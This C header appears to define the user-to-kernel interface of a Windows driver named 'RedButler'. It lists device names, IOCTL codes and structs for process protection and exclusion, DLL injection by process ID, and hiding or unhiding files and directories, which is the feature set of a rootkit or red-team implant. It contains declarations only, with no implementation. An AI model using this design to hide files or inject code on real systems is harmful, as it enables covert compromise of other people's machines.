#pragma once

#define DEVICE_NAME             L"\\Device\\RedButler"
#define DOS_DEVICES_LINK_NAME   L"\\DosDevices\\RedButler"
#define DEVICE_WIN32_NAME       L"\\\\.\\RedButler"

#define BUT_IOCTL_SET_DRIVER_STATE				CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  0), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define BUT_IOCTL_GET_DRIVER_STATE				CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  1), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#define BUT_IOCTL_CHANGE_PROCESS_PROTECTION		CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  10), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define BUT_IOCTL_CHANGE_PROCESS_EXCLUSION		CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  11), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define BUT_IOCTL_GET_PROCESS_ATTRIBUTES		CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  12), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define BUT_IOCTL_CLEAR_PROCESS_ATTRIBUTES		CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  13), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define BUT_IOCTL_INJECT_DLL					CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  14), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#define BUT_IOCTL_HIDE_FILE						CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  15), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define BUT_IOCTL_UNHIDE_FILE					CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  16), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define BUT_IOCTL_HIDE_DIRECTORY				CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  17), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define BUT_IOCTL_UNHIDE_DIRECTORY				CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  18), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#define BUT_IOCTL_UNHIDE_ALL_FILES				CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  19), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define BUT_IOCTL_UNHIDE_ALL_DIRECTORIES		CTL_CODE (FILE_DEVICE_UNKNOWN, (0x1234 +  20), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#pragma pack(push, 4)

// Used by the driver to return data to userland
typedef struct _but_status_packet {
	NTSTATUS ntStatus;
	SIZE_T szAdditionalDataSize;
	union {
		BOOLEAN bState;
	} info;
} BUT_STATUS_PACKET, * PBUT_STATUS_PACKET;

typedef struct _but_process_state_packet {
	DWORD32 dwProcessId;
	BOOLEAN bProtected;
	BOOLEAN bExcluded;
} BUT_PROCESS_STATE_PACKET, * PBUT_PROCESS_STATE_PACKET;

typedef struct _but_dll_injection_packet {
	DWORD32 dwProcessId;
	WCHAR	wDllPath[512];
} BUT_DLL_INJECTION_PACKET, * PBUT_DLL_INJECTION_PACKET;

typedef struct _but_hide_file_packet {
	WCHAR wFullPath[512];
	ULONG uObjectId;
} BUT_HIDE_FILE_PACKET, * PBUT_HIDE_FILE_PACKET;

typedef struct _but_unhide_file_packet {
	ULONG uObjectId;
} BUT_UNHIDE_FILE_PACKET, * PBUT_UNHIDE_FILE_PACKET;

typedef BUT_HIDE_FILE_PACKET BUT_HIDE_DIRECTORY_PACKET;
typedef PBUT_HIDE_FILE_PACKET PBUT_HIDE_DIRECTORY_PACKET;

typedef BUT_UNHIDE_FILE_PACKET BUT_UNHIDE_DIRECTORY_PACKET;
typedef PBUT_UNHIDE_FILE_PACKET PBUT_UNHIDE_DIRECTORY_PACKET;

#pragma pack(pop)